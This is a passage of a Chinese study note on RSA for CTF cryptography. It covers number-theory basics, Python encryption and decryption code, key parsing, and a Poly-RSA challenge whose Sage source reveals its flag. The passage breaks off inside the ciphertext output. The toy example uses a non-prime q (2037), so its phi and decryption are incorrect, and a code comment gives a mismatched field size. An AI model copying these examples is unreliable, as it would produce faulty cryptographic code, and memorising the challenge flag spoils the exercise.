\]</span> 即<span class="math inline">\(c\)</span>对<span class="math inline">\(n\)</span>的模反元素的<span class="math inline">\(-s\)</span>次幂</p>
<h2 id="欧拉函数">欧拉函数</h2>
<ul>
<li><p>如果<span class="math inline">\(p\)</span>是素数且<span class="math inline">\(k\geq 1\)</span>，则 <span class="math display">\[
\phi (p^k)=p^k-p^{k-1}
\]</span> 特别地，当<span class="math inline">\(k=1\)</span>时，表达式即为 <span class="math display">\[
\phi (p)=p-1
\]</span></p></li>
<li><p>如果<span class="math inline">\(gcd(m, n)=1\)</span>，即<span class="math inline">\(m,n\)</span>互质，则 <span class="math display">\[
\phi (mn)=\phi (m)\phi (n)
\]</span></p></li>
</ul>
<p>其中与之相关的有欧拉公式：</p>
<p>对任意两个互素整数 <span class="math inline">\(a,n\)</span>，有 <span class="math display">\[
a^{\varphi(n)}=1\pmod{n}
\]</span></p>
<h2 id="中国剩余定理">中国剩余定理</h2>
<p>设<span class="math inline">\(m\)</span>与<span class="math inline">\(n\)</span>是整数，<span class="math inline">\(gcd(m,n)=1\)</span>，<span class="math inline">\(b\)</span>与<span class="math inline">\(c\)</span>是任意整数，则同余式组 <span class="math display">\[
x\equiv b\ (mod\ m)\ 与\ x\equiv c\ (mod\ n)
\]</span> 恰有一个解 <span class="math inline">\(0\leq x\leq
mn\)</span></p>
<p>详细内容可以在<a href="/CRT-note.html">这里</a>了解</p>
<h2 id="威尔逊定理">威尔逊定理</h2>
<p>威尔逊定理给出了判定一个自然数是否为素数的充分必要条件：</p>
<p>当且仅当 <span class="math inline">\(p\)</span> 为素数时，有 <span class="math display">\[
(p-1)!\equiv-1\pmod{p}
\]</span> 或推论 <span class="math display">\[
(p-1)!+1=0\pmod{p}
\]</span> 即 <span class="math inline">\((p-1)!+1\)</span> 为 <span class="math inline">\(p\)</span> 的倍数。</p>
<p>一般用于辅助推导，相关的有伽马函数 <span class="math display">\[
\Gamma(n)=(n-1)!
\]</span></p>
<h2 id="费马小定理">费马小定理</h2>
<p>如果 <span class="math inline">\(p\)</span> 是一个素数，取任意的非
<span class="math inline">\(p\)</span> 整数 <span class="math inline">\(a\)</span>，有 <span class="math display">\[
a^{p-1}\equiv1\pmod{p}
\]</span> 推论有： <span class="math display">\[
na^{p-1}\equiv n\pmod{p},n\in\Z\\
a^{p-2}\equiv a^{-1}\pmod{p}\\
a^b\equiv a^{b\pmod{p-1}}\pmod{p},b\in\Z\\
\]</span></p>
<h1 id="rsapython-实现">RSA&amp;python 实现</h1>
<h2 id="加密">加密</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=<span class="number">447685307</span></span><br><span class="line">q=<span class="number">2037</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">m = <span class="number">904332399012</span></span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br></pre></td></tr></table></figure>
<h2 id="解密">解密</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p=<span class="number">447685307</span></span><br><span class="line">q=<span class="number">2037</span></span><br><span class="line">e=<span class="number">17</span></span><br><span class="line">c=<span class="number">704796792</span></span><br><span class="line">n = p * q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line"><span class="comment"># 旧版本python需要使用gmpy2库求解逆元</span></span><br><span class="line"><span class="comment"># import gmpy2</span></span><br><span class="line"><span class="comment"># d = gmpy2.invert(e, phi)</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br></pre></td></tr></table></figure>
<h2 id="读取参数">读取参数</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./tmp/pubkey.pem&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    key = RSA.importKey(f)</span><br><span class="line">    N = key.n</span><br><span class="line">    e = key.e  </span><br></pre></td></tr></table></figure>
<p>也可以使用在线网站：<a href="http://www.hiencode.com/pub_asys.html">http://www.hiencode.com/pub_asys.html</a></p>
<p>或者使用 openssl 的 rsa 工具，例如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> pub.key -text</span><br></pre></td></tr></table></figure>
<h2 id="poly-rsa">Poly-RSA</h2>
<h3 id="加密-1">加密</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="built_in">list</span>(<span class="string">b&#x27;watevr&#123;RSA_from_ikea_is_fun_but_insecure#k20944uehdjfnjd335uro&#125;&#x27;</span>)</span><br><span class="line">p = <span class="number">43753</span></span><br><span class="line"><span class="comment">## Univariate Polynomial Ring in y over Finite Field of size p</span></span><br><span class="line">R.&lt;y&gt; = GF(p)[]</span><br><span class="line"></span><br><span class="line"><span class="comment">## Analogous to the primes in Z</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_irreducable_poly</span>(<span class="params">deg</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        out = R.random_element(degree=deg)</span><br><span class="line">        <span class="keyword">if</span> out.is_irreducible():</span><br><span class="line">            <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Polynomial &quot;primes&quot;</span></span><br><span class="line">P = gen_irreducable_poly(ZZ.random_element(length, <span class="number">2</span>*length))</span><br><span class="line">Q = gen_irreducable_poly(ZZ.random_element(length, <span class="number">2</span>*length))</span><br><span class="line"></span><br><span class="line"><span class="comment">## Public exponent key</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Modulus</span></span><br><span class="line">N = P*Q</span><br><span class="line"></span><br><span class="line"><span class="comment">## Univariate Quotient Polynomial Ring in x over Finite Field of size 659 with modulus N(x)</span></span><br><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Encrypt</span></span><br><span class="line">m = S(flag)</span><br><span class="line">c = m^e</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">P=y^<span class="number">65</span> + <span class="number">39688</span>*y^<span class="number">64</span> + <span class="number">22199</span>*y^<span class="number">63</span> + <span class="number">41942</span>*y^<span class="number">62</span> + <span class="number">7803</span>*y^<span class="number">61</span> + <span class="number">19710</span>*y^<span class="number">60</span> + <span class="number">14794</span>*y^<span class="number">59</span> + <span class="number">41388</span>*y^<span class="number">58</span> + <span class="number">2418</span>*y^<span class="number">57</span> + <span class="number">19208</span>*y^<span class="number">56</span> + <span class="number">39941</span>*y^<span class="number">55</span> + <span class="number">36392</span>*y^<span class="number">54</span> + <span class="number">19813</span>*y^<span class="number">53</span> + <span class="number">33864</span>*y^<span class="number">52</span> + <span class="number">29099</span>*y^<span class="number">51</span> + <span class="number">15484</span>*y^<span class="number">50</span> + <span class="number">27185</span>*y^<span class="number">49</span> + <span class="number">27721</span>*y^<span class="number">48</span> + <span class="number">31508</span>*y^<span class="number">47</span> + <span class="number">19404</span>*y^<span class="number">46</span> + <span class="number">10134</span>*y^<span class="number">45</span> + <span class="number">43481</span>*y^<span class="number">44</span> + <span class="number">3899</span>*y^<span class="number">43</span> + <span class="number">32849</span>*y^<span class="number">42</span> + <span class="number">3534</span>*y^<span class="number">41</span> + <span class="number">32086</span>*y^<span class="number">40</span> + <span class="number">14221</span>*y^<span class="number">39</span> + <span class="number">42982</span>*y^<span class="number">38</span> + <span class="number">1403</span>*y^<span class="number">37</span> + <span class="number">1619</span>*y^<span class="number">36</span> + <span class="number">36054</span>*y^<span class="number">35</span> + <span class="number">33615</span>*y^<span class="number">34</span> + <span class="number">6628</span>*y^<span class="number">33</span> + <span class="number">31709</span>*y^<span class="number">32</span> + <span class="number">6968</span>*y^<span class="number">31</span> + <span class="number">28517</span>*y^<span class="number">30</span> + <span class="number">12938</span>*y^<span class="number">29</span> + <span class="number">21124</span>*y^<span class="number">28</span> + <span class="number">10400</span>*y^<span class="number">27</span> + <span class="number">28889</span>*y^<span class="number">26</span> + <span class="number">7273</span>*y^<span class="number">25</span> + <span class="number">36442</span>*y^<span class="number">24</span> + <span class="number">14935</span>*y^<span class="number">23</span> + <span class="number">29365</span>*y^<span class="number">22</span> + <span class="number">4869</span>*y^<span class="number">21</span> + <span class="number">43562</span>*y^<span class="number">20</span> + <span class="number">6435</span>*y^<span class="number">19</span> + <span class="number">4403</span>*y^<span class="number">18</span> + <span class="number">32311</span>*y^<span class="number">17</span> + <span class="number">7575</span>*y^<span class="number">16</span> + <span class="number">28199</span>*y^<span class="number">15</span> + <span class="number">28065</span>*y^<span class="number">14</span> + <span class="number">23870</span>*y^<span class="number">13</span> + <span class="number">37314</span>*y^<span class="number">12</span> + <span class="number">15299</span>*y^<span class="number">11</span> + <span class="number">7082</span>*y^<span class="number">10</span> + <span class="number">36230</span>*y^<span class="number">9</span> + <span class="number">18367</span>*y^<span class="number">8</span> + <span class="number">12531</span>*y^<span class="number">7</span> + <span class="number">25906</span>*y^<span class="number">6</span> + <span class="number">26878</span>*y^<span class="number">5</span> + <span class="number">43073</span>*y^<span class="number">4</span> + <span class="number">11582</span>*y^<span class="number">3</span> + <span class="number">4482</span>*y^<span class="number">2</span> + <span class="number">35044</span>*y + <span class="number">31388</span></span><br><span class="line">Q=y^<span class="number">112</span> + <span class="number">31097</span>*y^<span class="number">111</span> + <span class="number">15815</span>*y^<span class="number">110</span> + <span class="number">17170</span>*y^<span class="number">109</span> + <span class="number">43684</span>*y^<span class="number">108</span> + <span class="number">16873</span>*y^<span class="number">107</span> + <span class="number">17269</span>*y^<span class="number">106</span> + <span class="number">10853</span>*y^<span class="number">105</span> + <span class="number">10690</span>*y^<span class="number">104</span> + <span class="number">24864</span>*y^<span class="number">103</span> + <span class="number">10224</span>*y^<span class="number">102</span> + <span class="number">28704</span>*y^<span class="number">101</span> + <span class="number">16049</span>*y^<span class="number">100</span> + <span class="number">1154</span>*y^<span class="number">99</span> + <span class="number">40034</span>*y^<span class="number">98</span> + <span class="number">29922</span>*y^<span class="number">97</span> + <span class="number">27404</span>*y^<span class="number">96</span> + <span class="number">32514</span>*y^<span class="number">95</span> + <span class="number">40962</span>*y^<span class="number">94</span> + <span class="number">32858</span>*y^<span class="number">93</span> + <span class="number">36590</span>*y^<span class="number">92</span> + <span class="number">41302</span>*y^<span class="number">91</span> + <span class="number">20803</span>*y^<span class="number">90</span> + <span class="number">43521</span>*y^<span class="number">89</span> + <span class="number">13746</span>*y^<span class="number">88</span> + <span class="number">19857</span>*y^<span class="number">87</span> + <span class="number">21539</span>*y^<span class="number">86</span> + <span class="number">36888</span>*y^<span class="number">85</span> + <span class="number">16032</span>*y^<span class="number">84</span> + <span class="number">35825</span>*y^<span class="number">83</span> + <span class="number">24705</span>*y^<span class="number">82</span> + <span class="number">31143</span>*y^<span class="number">81</span> + <span class="number">22088</span>*y^<span class="number">80</span> + <span class="number">6686</span>*y^<span class="number">79</span> + <span class="number">37947</span>*y^<span class="number">78</span> + <span class="number">5661</span>*y^<span class="number">77</span> + <span class="number">29405</span>*y^<span class="number">76</span> + <span class="number">36071</span>*y^<span class="number">75</span> + <span class="number">35492</span>*y^<span class="number">74</span> + <span class="number">28985</span>*y^<span class="number">73</span> + <span class="number">36015</span>*y^<span class="number">72</span> + <span class="number">24095</span>*y^<span class="number">71</span> + <span class="number">34920</span>*y^<span class="number">70</span> + <span class="number">6615</span>*y^<span class="number">69</span> + <span class="number">9606</span>*y^<span class="number">68</span> + <span class="number">4255</span>*y^<span class="number">67</span> + <span class="number">22981</span>*y^<span class="number">66</span> + <span class="number">3910</span>*y^<span class="number">65</span> + <span class="number">23897</span>*y^<span class="number">64</span> + <span class="number">22711</span>*y^<span class="number">63</span> + <span class="number">23350</span>*y^<span class="number">62</span> + <span class="number">7969</span>*y^<span class="number">61</span> + <span class="number">8558</span>*y^<span class="number">60</span> + <span class="number">8001</span>*y^<span class="number">59</span> + <span class="number">8431</span>*y^<span class="number">58</span> + <span class="number">3314</span>*y^<span class="number">57</span> + <span class="number">23364</span>*y^<span class="number">56</span> + <span class="number">39391</span>*y^<span class="number">55</span> + <span class="number">32722</span>*y^<span class="number">54</span> + <span class="number">2543</span>*y^<span class="number">53</span> + <span class="number">22196</span>*y^<span class="number">52</span> + <span class="number">24189</span>*y^<span class="number">51</span> + <span class="number">19420</span>*y^<span class="number">50</span> + <span class="number">10649</span>*y^<span class="number">49</span> + <span class="number">19070</span>*y^<span class="number">48</span> + <span class="number">23863</span>*y^<span class="number">47</span> + <span class="number">19597</span>*y^<span class="number">46</span> + <span class="number">39699</span>*y^<span class="number">45</span> + <span class="number">7620</span>*y^<span class="number">44</span> + <span class="number">25067</span>*y^<span class="number">43</span> + <span class="number">29912</span>*y^<span class="number">42</span> + <span class="number">14998</span>*y^<span class="number">41</span> + <span class="number">14492</span>*y^<span class="number">40</span> + <span class="number">31322</span>*y^<span class="number">39</span> + <span class="number">43145</span>*y^<span class="number">38</span> + <span class="number">32006</span>*y^<span class="number">37</span> + <span class="number">38976</span>*y^<span class="number">36</span> + <span class="number">32534</span>*y^<span class="number">35</span> + <span class="number">6972</span>*y^<span class="number">34</span> + <span class="number">37351</span>*y^<span class="number">33</span> + <span class="number">30104</span>*y^<span class="number">32</span> + <span class="number">6032</span>*y^<span class="number">31</span> + <span class="number">33729</span>*y^<span class="number">30</span> + <span class="number">27110</span>*y^<span class="number">29</span> + <span class="number">5268</span>*y^<span class="number">28</span> + <span class="number">2974</span>*y^<span class="number">27</span> + <span class="number">2985</span>*y^<span class="number">26</span> + <span class="number">31610</span>*y^<span class="number">25</span> + <span class="number">28364</span>*y^<span class="number">24</span> + <span class="number">34924</span>*y^<span class="number">23</span> + <span class="number">17414</span>*y^<span class="number">22</span> + <span class="number">28813</span>*y^<span class="number">21</span> + <span class="number">43680</span>*y^<span class="number">20</span> + <span class="number">32175</span>*y^<span class="number">19</span> + <span class="number">18248</span>*y^<span class="number">18</span> + <span class="number">25171</span>*y^<span class="number">17</span> + <span class="number">31185</span>*y^<span class="number">16</span> + <span class="number">30125</span>*y^<span class="number">15</span> + <span class="number">36836</span>*y^<span class="number">14</span> + <span class="number">7218</span>*y^<span class="number">13</span> + <span class="number">11292</span>*y^<span class="number">12</span> + <span class="number">31123</span>*y^<span class="number">11</span> + <span class="number">40360</span>*y^<span class="number">10</span> + <span class="number">34093</span>*y^<span class="number">9</span> + <span class="number">39606</span>*y^<span class="number">8</span> + <span class="number">2788</span>*y^<span class="number">7</span> + <span class="number">27277</span>*y^<span class="number">6</span> + <span class="number">21835</span>*y^<span class="number">5</span> + <span class="number">1331</span>*y^<span class="number">4</span> + <span class="number">32614</span>*y^<span class="number">3</span> + <span class="number">25020</span>*y^<span class="number">2</span> + <span class="number">20981</span>*y + <span class="number">12108</span></span><br><span class="line">N=<span class="number">34036</span>*y^<span class="number">177</span> + <span class="number">23068</span>*y^<span class="number">176</span> + <span class="number">13147</span>*y^<span class="number">175</span> + <span class="number">36344</span>*y^<span class="number">174</span> + <span class="number">10045</span>*y^<span class="number">173</span> + <span class="number">41049</span>*y^<span class="number">172</span> + <span class="number">17786</span>*y^<span class="number">171</span> + <span class="number">16601</span>*y^<span class="number">170</span> + <span class="number">7929</span>*y^<span class="number">169</span> + <span class="number">37570</span>*y^<span class="number">168</span> + <span class="number">990</span>*y^<span class="number">167</span> + <span class="number">9622</span>*y^<span class="number">166</span> + <span class="number">39273</span>*y^<span class="number">165</span> + <span class="number">35284</span>*y^<span class="number">164</span> + <span class="number">15632</span>*y^<span class="number">163</span> + <span class="number">18850</span>*y^<span class="number">162</span> + <span class="number">8800</span>*y^<span class="number">161</span> + <span class="number">33148</span>*y^<span class="number">160</span> + <span class="number">12147</span>*y^<span class="number">159</span> + <span class="number">40487</span>*y^<span class="number">158</span> + <span class="number">6407</span>*y^<span class="number">157</span> + <span class="number">34111</span>*y^<span class="number">156</span> + <span class="number">8446</span>*y^<span class="number">155</span> + <span class="number">21908</span>*y^<span class="number">154</span> + <span class="number">16812</span>*y^<span class="number">153</span> + <span class="number">40624</span>*y^<span class="number">152</span> + <span class="number">43506</span>*y^<span class="number">151</span> + <span class="number">39116</span>*y^<span class="number">150</span> + <span class="number">33011</span>*y^<span class="number">149</span> + <span class="number">23914</span>*y^<span class="number">148</span> + <span class="number">2210</span>*y^<span class="number">147</span> + <span class="number">23196</span>*y^<span class="number">146</span> + <span class="number">43359</span>*y^<span class="number">145</span> + <span class="number">34455</span>*y^<span class="number">144</span> + <span class="number">17684</span>*y^<span class="number">143</span> + <span class="number">25262</span>*y^<span class="number">142</span> + <span class="number">982</span>*y^<span class="number">141</span> + <span class="number">24015</span>*y^<span class="number">140</span> + <span class="number">27968</span>*y^<span class="number">139</span> + <span class="number">37463</span>*y^<span class="number">138</span> + <span class="number">10667</span>*y^<span class="number">137</span> + <span class="number">39519</span>*y^<span class="number">136</span> + <span class="number">31176</span>*y^<span class="number">135</span> + <span class="number">27520</span>*y^<span class="number">134</span> + <span class="number">32118</span>*y^<span class="number">133</span> + <span class="number">8333</span>*y^<span class="number">132</span> + <span class="number">38945</span>*y^<span class="number">131</span> + <span class="number">34713</span>*y^<span class="number">130</span> + <span class="number">1107</span>*y^<span class="number">129</span> + <span class="number">43604</span>*y^<span class="number">128</span> + <span class="number">4433</span>*y^<span class="number">127</span> + <span class="number">18110</span>*y^<span class="number">126</span> + <span class="number">17658</span>*y^<span class="number">125</span> + <span class="number">32354</span>*y^<span class="number">124</span> + <span class="number">3219</span>*y^<span class="number">123</span> + <span class="number">40238</span>*y^<span class="number">122</span> + <span class="number">10439</span>*y^<span class="number">121</span> + <span class="number">3669</span>*y^<span class="number">120</span> + <span class="number">8713</span>*y^<span class="number">119</span> + <span class="number">21027</span>*y^<span class="number">118</span> + <span class="number">29480</span>*y^<span class="number">117</span> + <span class="number">5477</span>*y^<span class="number">116</span> + <span class="number">24332</span>*y^<span class="number">115</span> + <span class="number">43480</span>*y^<span class="number">114</span> + <span class="number">33406</span>*y^<span class="number">113</span> + <span class="number">43121</span>*y^<span class="number">112</span> + <span class="number">1114</span>*y^<span class="number">111</span> + <span class="number">17198</span>*y^<span class="number">110</span> + <span class="number">22829</span>*y^<span class="number">109</span> + <span class="number">24424</span>*y^<span class="number">108</span> + <span class="number">16523</span>*y^<span class="number">107</span> + <span class="number">20424</span>*y^<span class="number">106</span> + <span class="number">36206</span>*y^<span class="number">105</span> + <span class="number">41849</span>*y^<span class="number">104</span> + <span class="number">3584</span>*y^<span class="number">103</span> + <span class="number">26500</span>*y^<span class="number">102</span> + <span class="number">31897</span>*y^<span class="number">101</span> + <span class="number">34640</span>*y^<span class="number">100</span> + <span class="number">27449</span>*y^<span class="number">99</span> + <span class="number">30962</span>*y^<span class="number">98</span> + <span class="number">41434</span>*y^<span class="number">97</span> + <span class="number">22125</span>*y^<span class="number">96</span> + <span class="number">24314</span>*y^<span class="number">95</span> + <span class="number">3944</span>*y^<span class="number">94</span> + <span class="number">18400</span>*y^<span class="number">93</span> + <span class="number">38476</span>*y^<span class="number">92</span> + <span class="number">28904</span>*y^<span class="number">91</span> + <span class="number">27936</span>*y^<span class="number">90</span> + <span class="number">41867</span>*y^<span class="number">89</span> + <span class="number">25573</span>*y^<span class="number">88</span> + <span class="number">25659</span>*y^<span class="number">87</span> + <span class="number">33443</span>*y^<span class="number">86</span> + <span class="number">18435</span>*y^<span class="number">85</span> + <span class="number">5934</span>*y^<span class="number">84</span> + <span class="number">38030</span>*y^<span class="number">83</span> + <span class="number">17563</span>*y^<span class="number">82</span> + <span class="number">24086</span>*y^<span class="number">81</span> + <span class="number">36782</span>*y^<span class="number">80</span> + <span class="number">20922</span>*y^<span class="number">79</span> + <span class="number">38933</span>*y^<span class="number">78</span> + <span class="number">23448</span>*y^<span class="number">77</span> + <span class="number">10599</span>*y^<span class="number">76</span> + <span class="number">7156</span>*y^<span class="number">75</span> + <span class="number">29044</span>*y^<span class="number">74</span> + <span class="number">23605</span>*y^<span class="number">73</span> + <span class="number">7657</span>*y^<span class="number">72</span> + <span class="number">28200</span>*y^<span class="number">71</span> + <span class="number">2431</span>*y^<span class="number">70</span> + <span class="number">3860</span>*y^<span class="number">69</span> + <span class="number">23259</span>*y^<span class="number">68</span> + <span class="number">14590</span>*y^<span class="number">67</span> + <span class="number">33631</span>*y^<span class="number">66</span> + <span class="number">15673</span>*y^<span class="number">65</span> + <span class="number">36049</span>*y^<span class="number">64</span> + <span class="number">29728</span>*y^<span class="number">63</span> + <span class="number">22413</span>*y^<span class="number">62</span> + <span class="number">18602</span>*y^<span class="number">61</span> + <span class="number">18557</span>*y^<span class="number">60</span> + <span class="number">23505</span>*y^<span class="number">59</span> + <span class="number">17642</span>*y^<span class="number">58</span> + <span class="number">12595</span>*y^<span class="number">57</span> + <span class="number">17255</span>*y^<span class="number">56</span> + <span class="number">15316</span>*y^<span class="number">55</span> + <span class="number">8948</span>*y^<span class="number">54</span> + <span class="number">38</span>*y^<span class="number">53</span> + <span class="number">40329</span>*y^<span class="number">52</span> + <span class="number">9823</span>*y^<span class="number">51</span> + <span class="number">5798</span>*y^<span class="number">50</span> + <span class="number">6379</span>*y^<span class="number">49</span> + <span class="number">8662</span>*y^<span class="number">48</span> + <span class="number">34640</span>*y^<span class="number">47</span> + <span class="number">38321</span>*y^<span class="number">46</span> + <span class="number">18760</span>*y^<span class="number">45</span> + <span class="number">13135</span>*y^<span class="number">44</span> + <span class="number">15926</span>*y^<span class="number">43</span> + <span class="number">34952</span>*y^<span class="number">42</span> + <span class="number">28940</span>*y^<span class="number">41</span> + <span class="number">13558</span>*y^<span class="number">40</span> + <span class="number">42579</span>*y^<span class="number">39</span> + <span class="number">38015</span>*y^<span class="number">38</span> + <span class="number">33788</span>*y^<span class="number">37</span> + <span class="number">12381</span>*y^<span class="number">36</span> + <span class="number">195</span>*y^<span class="number">35</span> + <span class="number">13709</span>*y^<span class="number">34</span> + <span class="number">31500</span>*y^<span class="number">33</span> + <span class="number">32994</span>*y^<span class="number">32</span> + <span class="number">30486</span>*y^<span class="number">31</span> + <span class="number">40414</span>*y^<span class="number">30</span> + <span class="number">2578</span>*y^<span class="number">29</span> + <span class="number">30525</span>*y^<span class="number">28</span> + <span class="number">43067</span>*y^<span class="number">27</span> + <span class="number">6195</span>*y^<span class="number">26</span> + <span class="number">36288</span>*y^<span class="number">25</span> + <span class="number">23236</span>*y^<span class="number">24</span> + <span class="number">21493</span>*y^<span class="number">23</span> + <span class="number">15808</span>*y^<span class="number">22</span> + <span class="number">34500</span>*y^<span class="number">21</span> + <span class="number">6390</span>*y^<span class="number">20</span> + <span class="number">42994</span>*y^<span class="number">19</span> + <span class="number">42151</span>*y^<span class="number">18</span> + <span class="number">19248</span>*y^<span class="number">17</span> + <span class="number">19291</span>*y^<span class="number">16</span> + <span class="number">8124</span>*y^<span class="number">15</span> + <span class="number">40161</span>*y^<span class="number">14</span> + <span class="number">24726</span>*y^<span class="number">13</span> + <span class="number">31874</span>*y^<span class="number">12</span> + <span class="number">30272</span>*y^<span class="number">11</span> + <span class="number">30761</span>*y^<span class="number">10</span> + <span class="number">2296</span>*y^<span class="number">9</span> + <span class="number">11017</span>*y^<span class="number">8</span> + <span class="number">16559</span>*y^<span class="number">7</span> + <span class="number">28949</span>*y^<span class="number">6</span> + <span class="number">40499</span>*y^<span class="number">5</span> + <span class="number">22377</span>*y^<span class="number">4</span> + <span class="number">33628</span>*y^<span class="number">3</span> + <span class="number">30598</span>*y^<span class="number">2</span> + <span class="number">4386</span>*y + <span class="number">23814</span></span><br><span class="line">c=<span class="number">5209</span>*x^<span class="number">176</span> + <span class="number">10881</span>*x^<span class="number">175</span> + <span class="number">31096</span>*x^<span class="number">174</span> + <span class="number">23354</span>*x^<span class="number">173</span> + <span class="number">28337</span>*x^<span class="number">172</span> + <span class="number">15982</span>*x^<span class="number">171</span> + <span class="number">13515</span>*x^<span class="number">170</span> + <span class="number">21641</span>*x^<span class="number">169</span> + <span class="number">10254</span>*x^<span class="number">168</span> + <span class="number">34588</span>*x^<span class="number">167</span> + <span class="number">27434</span>*x^<span class="number">166</span> + <span class="number">29552</span>*x^<span class="number">165</span> + <span class="number">7105</span>*x^<span class="number">164</span> + <span class="number">22604</span>*x^<span class="number">163</span> + <span class="number">41253</span>*x^<span class="number">162</span> + <span class="number">42675</span>*x^<span class="number">161</span> + <span class="number">21153</span>*x^<span class="number">160</span> + <span class="number">32838</span>*x^<span class="number">159</span> + <span class="number">34391</span>*x^<span class="number">158</span> + <span class="number">832</span>*x^<span class="number">157</span> + <span class="number">720</span>*x^<span class="number">156</span> + <span class="number">22883</span>*x^<span class="number">155</span> + <span class="number">19236</span>*x^<span class="number">154</span> + <span class="number">33772</span>*x^<span class="number">153</span> + <span class="number">5020</span>*x^<span class="number">152</span> + <span class="number">17943</span>*x^<span class="number">151</span> + <span class="number">26967</span>*x^<span class="number">150</span> + <span class="number">30847</span>*x^<span class="number">149</span> + <span class="number">10306</span>*x^<span class="number">148</span> + <span class="number">33966</span>*x^<span class="number">147</span> + <span class="number">43255</span>*x^<span class="number">146</span> + <span class="number">20342</span>*x^<span class="number">145</span> + <span class="number">4474</span>*x^<span class="number">144</span> + <span class="number">3490</span>*x^<span class="number">143</span> + <span class="number">38033</span>*x^<span class="number">142</span> + <span class="number">11224</span>*x^<span class="number">141</span> + <span class="number">30565</span>*x^<span class="number">140</span> + <span class="number">31967</span>*x^<span class="number">139</span> + <span class="number">32382</span>*x^<span class="number">138</span> + <span class="number">9759</span>*x^<span class="number">137</span> + <span class="number">1030</span>*x^<span class="number">136</span> + <span class="number">32122</span>*x^<span class="number">135</span> + <span class="number">42614</span>*x^<span class="number">134</span> + <span class="number">14280</span>*x^<span class="number">133</span> + <span class="number">16533</span>*x^<span class="number">132</span> + <span class="number">32676</span>*x^<span class="number">131</span> + <span class="number">43070</span>*x^<span class="number">130</span> + <span class="number">36009</span>*x^<span class="number">129</span> + <span class="number">28497</span>*x^<span class="number">128</span> + <span class="number">2940</span>*x^<span class="number">127</span> + <span class="number">9747</span>*x^<span class="number">126</span> + <span class="number">22758</span>*x^<span class="number">125</span> + <span class="number">16615</span>*x^<span class="number">124</span> + <span class="number">14086</span>*x^<span class="number">123</span> + <span class="number">13038</span>*x^<span class="number">122</span> + <span class="number">39603</span>*x^<span class="number">121</span> + <span class="number">36260</span>*x^<span class="number">120</span> + <span class="number">32502</span>*x^<span class="number">119</span> + <span class="number">17619</span>*x^<span class="number">118</span> + <span class="number">17700</span>*x^<span class="number">117</span> + <span class="number">15083</span>*x^<span class="number">116</span> + <span class="number">11311</span>*x^<span class="number">115</span> + <span class="number">36496</span>*x^<span class="number">114</span> + <span class="number">1300</span>*x^<span class="number">113</span> + <span class="number">13601</span>*x^<span class="number">112</span> + <span class="number">43425</span>*x^<span class="number">111</span> + <span class="number">10376</span>*x^<span class="number">110</span> + <span class="number">11551</span>*x^<span class="number">109</span> + <span class="number">13684</span>*x^<span class="number">108</span> + <span class="number">14955</span>*x^<span class="number">107</span> + <span class="number">6661</span>*x^<span class="number">106</span> + <span class="number">12674</span>*x^<span class="number">105</span> + <span class="number">21534</span>*x^<span class="number">104</span> + <span class="number">32132</span>*x^<span class="number">103</span> + <span class="number">34135</span>*x^<span class="number">102</span> + <span class="number">43684</span>*x^<span class="number">101</span> + <span class="number">837</span>*x^<span class="number">100</span> + <span class="number">29311</span>*x^<span class="number">99</span> + <span class="number">4849</span>*x^<span class="number">98</span> + <span class="number">26632</span>*x^<span class="number">97</span> + <span class="number">26662</span>*x^<span class="number">96</span> + <span class="number">10159</span>*x^<span class="number">95</span> + <span class="number">32657</span>*x^<span class="number">94</span> + <span class="number">12149</span>*x^<span class="number">93</span> + <span class="number">17858</span>*x^<span class="number">92</span> + <span class="number">35805</span>*x^<span class="number">91</span> + <span class="number">19391</span>*x^<span class="number">90</span> + <span class="number">30884</span>*x^<span class="number">89</span> + <span class="number">42039</span>*x^<span class="number">88</span> + <span class="number">17292</span>*x^<span class="number">87</span> + <span class="number">4694</span>*x^<span class="number">86</span> + <span class="number">1497</span>*x^<span class="number">85</span> + <span class="number">1744</span>*x^<span class="number">84</span> + <span class="number">31071</span>*x^<span class="number">83</span> + <span class="number">26246</span>*x^<span class="number">82</span> + <span class="number">24402</span>*x^<span class="number">81</span> + <span class="number">22068</span>*x^<span class="number">80</span> + <span class="number">39263</span>*x^<span class="number">79</span> + <span class="number">23703</span>*x^<span class="number">78</span> + <span class="number">21484</span>*x^<span class="number">77</span> + <span class="number">12241</span>*x^<span class="number">76</span> + <span class="number">28821</span>*x^<span class="number">75</span> + <span class="number">32886</span>*x^<span class="number">74</span> + <span class="number">43075</span>*x^<span class="number">73</span> + <span class="number">35741</span>*x^<span class="number">72</span> + <span class="number">19936</span>*x^<span class="number">71</span> + <span class="number">37219</span>*x^<span class="number">70</span> + <span class="number">33411</span>*x^<span class="number">69</span> + <span class="number">8301</span>*x^<span class="number">68</span> + <span class="number">12949</span>*x^<span class="number">67</span> + <span class="number">28611</span>*x^<span class="number">66</span> + <span class="number">42654</span>*x^<span class="number">65</span> + <span class="number">6910</span>*x^<span class="number">64</span> + <span class="number">18523</span>*x^<span class="number">63</span> + <span class="number">31144</span>*x^<span class="number">62</span> + <span class="number">21398</span>*x^<span class="number">61</span> + <span class="number">36298</span>*x^<span class="number">60</span> + <span 